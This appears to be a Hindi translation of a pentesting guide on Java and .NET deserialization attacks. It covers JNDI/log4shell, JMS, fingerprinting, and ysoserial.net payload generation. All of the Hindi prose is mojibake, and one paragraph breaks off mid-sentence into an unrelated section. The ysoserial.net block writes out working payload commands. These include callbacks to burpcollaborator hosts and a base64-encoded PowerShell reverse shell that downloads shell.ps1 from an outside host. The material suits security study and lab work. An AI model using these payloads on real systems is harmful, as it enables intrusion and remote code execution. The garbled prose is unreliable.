рдЗрд╕ рддрд░реАрдХреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдХреЗрд╡рд▓ рдЬреНрдЮрд╛рдд рдЦрддрд░рдирд╛рдХ рдкреНрд░рдХрд╛рд░реЛрдВ рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рд╡реНрд╣рд╛рдЗрдЯрд▓рд┐рд╕реНрдЯ рдирд╣реАрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХреНрдпреЛрдВрдХрд┐ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рд╣реЛрддрд╛ рдХрд┐ рдХреМрди рд╕реЗ рдСрдмреНрдЬреЗрдХреНрдЯ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдП рдЬрд╛ рд░рд╣реЗ рд╣реИрдВред

рдЗрди рдПрдЬреЗрдВрдЯреНрд╕ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдмрд╕ рдПрдХ рдирдпрд╛ JVM рдкреИрд░рд╛рдореАрдЯрд░ рдЬреЛрдбрд╝реЗрдВ:
```
-javaagent:name-of-agent.jar
```
рдЙрджрд╛рд╣рд░рдг: [rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0)

### рд╕рдВрджрд░реНрдн

* рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдФрд░ ysoserial рдЯреЙрдХ: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* gadgetinspector рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЯреЙрдХ: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec рдкреЗрдкрд░: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java рдФрд░ .Net JSON рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдкреЗрдкрд░: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf), рдЯреЙрдХ: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) рдФрд░ рд╕реНрд▓рд╛рдЗрдбреНрд╕: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди CVEs: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Injection рдФрд░ log4Shell

рдЬрд╛рдиреЗрдВ рдХрд┐ **JNDI Injection рдХреНрдпрд╛ рд╣реИ, рдЗрд╕реЗ RMI, CORBA рдФрд░ LDAP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ log4shell рдХреЛ рдХреИрд╕реЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** (рдФрд░ рдЗрд╕ рджреБрд░реБрдкрдпреЛрдЧ рдХреЗ рдЙрджрд╛рд╣рд░рдг) рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдкрд░:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢ рд╕реЗрд╡рд╛

> **рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢ рд╕реЗрд╡рд╛** (**JMS**) рдПрдкреАрдЖрдИ рджреЛ рдпрд╛ рдЕрдзрд┐рдХ рдХреНрд▓рд╛рдЗрдВрдЯреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЬрд╛рд╡рд╛ рд╕рдВрджреЗрд╢-рдЕрднрд┐рдиреНрдпрд╛рд╕реА рдордзреНрдпрд╡рд░реНрддреА рдПрдкреАрдЖрдИ рд╣реИред рдпрд╣ рдЙрддреНрдкрд╛рджрдХ-рдЙрдкрднреЛрдХреНрддрд╛ рд╕рдорд╕реНрдпрд╛ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рд╣реИред JMS рдЬрд╛рд╡рд╛ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо, рдПрдВрдЯрд░рдкреНрд░рд╛рдЗрдЬрд╝ рдПрдбрд┐рд╢рди (рдЬрд╛рд╡рд╛ рдИрдИ) рдХрд╛ рд╣рд┐рд╕реНрд╕рд╛ рд╣реИ рдФрд░ рдпрд╣ рд╕реВрд░реНрдп рдорд╛рдЗрдХреНрд░реЛрд╕рд┐рд╕реНрдЯрдореНрд╕ рджреНрд╡рд╛рд░рд╛ рд╡рд┐рдХрд╕рд┐рдд рдПрдХ рд╡рд┐рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рд▓реЗрдХрд┐рди рдЬрд┐рд╕реЗ рдмрд╛рдж рдореЗрдВ рдЬрд╛рд╡рд╛ рд╕рдореБрджрд╛рдп рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред рдпрд╣ рдПрдХ рд╕рдВрджреЗрд╢ рдорд╛рдирдХ рд╣реИ рдЬреЛ рдЬрд╛рд╡рд╛ рдИрдИ рдкрд░ рдЖрдзрд╛рд░рд┐рдд рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдШрдЯрдХреЛрдВ рдХреЛ рд╕рдВрджреЗрд╢ рдмрдирд╛рдиреЗ, рднреЗрдЬрдиреЗ, рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдФрд░ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред рдЗрд╕рдХреА рд╕рд╣рд╛рдпрддрд╛ рд╕реЗ рд╡рд┐рддрд░рд┐рдд рдПрдХ рдЕрдиреБрдкреНрд░рдпреЛрдЧ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рдШрдЯрдХреЛрдВ рдХреЗ рдмреАрдЪ рд╕рдВрдЪрд╛рд░ рдХреЛ рдвреАрд▓рд╛, рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдФрд░ рдЕрд╕рд┐рдВрдХреНрд░реЛрдирд╕ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред (рд╡рд┐рдХрд┐рдкреАрдбрд┐рдпрд╛ рд╕реЗ)ред

### рдЙрддреНрдкрд╛рдж

рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдордзреНрдпрд╡рд░реНрддреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрдИ рдЙрддреНрдкрд╛рдж рд╣реИрдВ:

![](<../../.gitbook/assets/image (291).png>)

![](<../../.gitbook/assets/image (292).png>)

### рд╢реЛрд╖рдг

рдЗрд╕рд▓рд┐рдП, рдореВрд▓ рд░реВрдк рд╕реЗ рдПрдХ **рд╕рдВрджреЗрд╢ рдкрд░ JMS рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдХрдИ рд╕реЗрд╡рд╛рдПрдВ рд╣реИрдВ**ред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЗрди рд╕реЗрд╡рд╛рдУрдВ рдХреЛ рд╕рдВрджреЗрд╢ рднреЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдкрд░реНрдпрд╛рдкреНрдд рдЕрдзрд┐рдХрд╛рд░ рд╣реИрдВ (рдЖрдорддреМрд░ рдкрд░ рдЖрдкрдХреЛ рдорд╛рдиреНрдп рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА), рддреЛ рдЖрдк **рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рдЧрдП рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рдВрджреЗрд╢ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред рдпреЗ рджреБрд░реБрдкрдпреЛрдЧ рд╕рднреА **рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЛ рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░реЗрдВрдЧреЗ рдЬреЛ рдЙрд╕ рд╕рдВрджреЗрд╢ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ**ред

рдЖрдкрдХреЛ рдпрд╛рдж рд░рдЦрдирд╛ рдЪрд╛рд╣рд┐рдП рдХрд┐ рдпрджрд┐ рдПрдХ рд╕реЗрд╡рд╛ рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ (рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдврдВрдЧ рд╕реЗ рдбреЗрд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд░рд╣реА рд╣реИ), рддреЛ рдЖрдкрдХреЛ рдлрд┐рд░ рднреА рдорд╛рдиреНрдп рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА рджреБрд░реБрдкрдпреЛрдЧ рдХреЛ рд╢реЛрд╖рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред

рдЯреВрд▓ [JMET](https://github.com/matthiaskaiser/jmet) рдХреЛ рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рддрд╛рдХрд┐ рдЗрд╕ рд╕реЗрд╡рд╛ рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░реЗрдВ рдФрд░ рдЬреНрдЮрд╛рдд рдЧреИрдЬреЗрдЯреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ
### рдлрд┐рдВрдЧрд░рдкреНрд░рд┐рдВрдЯ

#### WhiteBox

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рдмреНрджреЛрдВ рдХреЗ рд▓рд┐рдП рд╕реНрд░реЛрдд рдХреЛрдб рдЦреЛрдЬреЗрдВ:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдЪрд░ рдХреЗ рджреНрд╡рд╛рд░рд╛ рд╕реЗрдЯ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрд┐рд╕реА рднреА рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд░ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред

#### BlackBox

рдЖрдк рдмреЗрд╕64 рдХреЛрдбрд┐рдд рд╕реНрдЯреНрд░рд┐рдВрдЧ **AAEAAAD/////** рдпрд╛ рдХрд┐рд╕реА рдЕрдиреНрдп рдЪреАрдЬ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕реЗ **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ** рдФрд░ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдкреНрд░рдХрд╛рд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ **JSON** рдпрд╛ **XML** рдореЗрдВ `TypeObject` рдпрд╛ `$type` рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

### ysoserial.net

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЖрдк рдЙрдкрдХрд░рдг [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рддрд╛рдХрд┐ рдЖрдк **рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдЙрддреНрдкрд╛рджреЛрдВ рдХреЛ рдмрдирд╛ рд╕рдХреЗрдВ**ред рдЬрдм рдЖрдкрдиреЗ git рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдбрд╛рдЙрдирд▓реЛрдб рдХрд░ рд▓реА рд╣реЛ рддреЛ рдЖрдкрдХреЛ рдЙрдкрдХрд░рдг рдХреЛ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП Visual Studio рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВред

рдпрджрд┐ рдЖрдк рдЬрд╛рдирдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ **ysoserial.net рдЕрдкрдиреЗ рдЙрддреНрдкрд╛рдж рдХреЛ рдХреИрд╕реЗ рдмрдирд╛рддрд╛ рд╣реИ**, рддреЛ рдЖрдк [**рдЗрд╕ рдкреГрд╖реНрда рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рд╡реНрд░реИрдкрд░ + Json.Net рдлреЙрд░реНрдореЗрдЯрд░ рдХреЗ рд╕рд╛рде ObjectDataProvider рдЧреИрдЬреЗрдЯ рдХрд╛ рд╡реНрдпрд╛рдЦреНрдпрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md)ред

**ysoserial.net** рдХреЗ рдореБрдЦреНрдп рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ: **`--gadget`**, **`--formatter`**, \*\*`--output` \*\* рдФрд░ **`--plugin`.**

* **`--gadget`** рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдЧреИрдЬреЗрдЯ рдХреЛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХреЗрдВ (рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдХреЗ рджреМрд░рд╛рди рдЖрджреЗрд╢ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдХреНрд╖рд╛/рдХрд╛рд░реНрдп рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ)ред
* **`--formatter`**, рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЙрддреНрдкрд╛рдж рдХреЛ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рд╡рд┐рдзрд┐ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░реЗрдВ (рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдкреАрдЫреЗ рдХреА рдУрд░ рд╕реЗ рдЙрддреНрдкрд╛рдж рдХреЛ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреМрди рд╕реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдФрд░ рдЙрд╕реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ)
* \*\*`--output` \*\* рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЖрдк рдЪрд╛рд╣реЗрдВ рддреЛ рдЙрддреНрдкрд╛рдж рдХреЛ **рд╕реАрдзрд╛** рдпрд╛ **рдмреЗрд╕64 рдХреЛрдбрд┐рдд** рд░реВрдк рдореЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХреЗрдВред _рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **ysoserial.net** рдкреЗрд▓реЛрдб рдХреЛ **UTF-16LE** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХреЛрдбрд┐рдд рдХрд░реЗрдЧрд╛ (рдЬреЛ рд╡рд┐рдВрдбреЛрдЬ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реА рдХреЛрдбрд┐рдВрдЧ рд╣реИ) рдЗрд╕рд▓рд┐рдП рдпрджрд┐ рдЖрдк рд░реЙ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕реЗ рд▓рд┐рдирдХреНрд╕ рдХрдВрд╕реЛрд▓ рд╕реЗ рдХреЛрдбрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдХреБрдЫ **рдХреЛрдбрд┐рдВрдЧ рд╕рдВрдЧрддрддрд╛ рд╕рдорд╕реНрдпрд╛рдПрдВ** рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рдЙрддреНрдкрд╛рдж рдХреЛ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХреЗрдВрдЧреА (HTB JSON рдмреЙрдХреНрд╕ рдореЗрдВ рдкреЗрд▓реЛрдб UTF-16LE рдФрд░ ASCII рджреЛрдиреЛрдВ рдореЗрдВ рдХрд╛рдо рдХрд░ рдЧрдпрд╛ рдерд╛ рд▓реЗрдХрд┐рди рдпрд╣ рдпрд╣ рдирд╣реАрдВ рдорддрд▓рдм рд╣реИ рдХрд┐ рдпрд╣ рд╣рдореЗрд╢рд╛ рдХрд╛рдо рдХрд░реЗрдЧрд╛)ред_
* \*\*`--plugin` \*\* ysoserial.net рд╡рд┐рд╢реЗрд╖ рдлреНрд░реЗрдорд╡рд░реНрдХ рдХреЗ рд▓рд┐рдП **рдЙрддреНрдкрд╛рджреЛрдВ рдХреЛ рддреИрдпрд╛рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ** рдХрд╛ рдирд┐рд░реНрдорд╛рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдкреНрд▓рдЧрдЗрдиреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рддрд╛ рд╣реИред

#### рдЕрдзрд┐рдХ ysoserial.net рдкреИрд░рд╛рдореАрдЯрд░

* `--minify` рдПрдХ **рдЫреЛрдЯрд╛ рдкреЗрд▓реЛрдб** рдкреНрд░рджрд╛рди рдХрд░реЗрдЧрд╛ (рдпрджрд┐ рд╕рдВрднрд╡ рд╣реЛ)
* `--raf -f Json.Net -c "anything"` рдЗрд╕рд╕реЗ рдЙрди рд╕рднреА рдЧреИрдЬреЗрдЯ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ рджрд┐рдП рдЧрдП рдлреЙрд░реНрдореЗрдЯрд░ (`Json.Net` рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ) рдХреЗ рд╕рд╛рде рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ
* `--sf xml` рдЖрдк рдПрдХ рдЧреИрдЬреЗрдЯ (`-g`) рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ ysoserial.net рд╡рд╣рд╛рдВ "xml" рд╢рдмреНрдж рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдлреЙрд░реНрдореЗрдЯрд░ рдЦреЛрдЬреЗрдЧрд╛ (рдЕрд╡рдзрд┐рдХ рдирд╣реАрдВ рдХрд░рдиреЗ рд╡рд╛рд▓рд╛)

**ysoserial рдЙрджрд╛рд╣рд░рдг** рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net** рдореЗрдВ рдПрдХ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рдкреИрд░рд╛рдореАрдЯрд░ рднреА рд╣реИ рдЬреЛ рд╣рд░ рдПрдХ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреЗ рдХрд╛рдо рдХрд░рдиреЗ рдХреЛ рдмреЗрд╣рддрд░ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ: `--test`\
рдпрджрд┐ рдЖрдк рдЗрд╕ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдЗрдВрдбрд┐рдХреЗрдЯ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ **ysoserial.net** рд▓реЛрдХрд▓реА рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛, рдЗрд╕рд▓рд┐рдП рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХрд╛ рдкреЗрд▓реЛрдб рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдХрд╛рдо рдХрд░реЗрдЧрд╛ рдпрд╛ рдирд╣реАрдВред\
рдпрд╣ рдкреИрд░рд╛рдореАрдЯрд░ рдорджрджрдЧрд╛рд░ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрджрд┐ рдЖрдк рдХреЛрдб рдХреА рд╕рдореАрдХреНрд╖рд╛ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреИрд╕реЗ рдХреЛрдб рдЯреБрдХрдбрд╝реЛрдВ рдХреЛ рдкрд╛рдПрдВрдЧреЗ (рдпрд╣рд╛рдВ рд╕реЗ: [ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рдХреА рдкрд░реАрдХреНрд╖рдг рдХреЗ рд▓рд┐рдП рдХреЛрдб [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛ред
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
рдпрджрд┐ рдЖрдкрдХреЛ рдХрд┐рд╕реА .Net рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдХреБрдЫ рдРрд╕рд╛ рдорд┐рд▓рддрд╛ рд╣реИ рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╢рд╛рдпрдж рд╡рд╣ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреА рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИред\
рдЗрд╕рд▓рд┐рдП **`--test`** рдкреИрд░рд╛рдореАрдЯрд░ рд╣рдореЗрдВ рд╕рдордЭрдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреМрди рд╕реЗ рдХреЛрдб рдЪрдВрдХ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИрдВ, рдЬрд┐рдиреНрд╣реЗрдВ **ysoserial.net** рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### ViewState

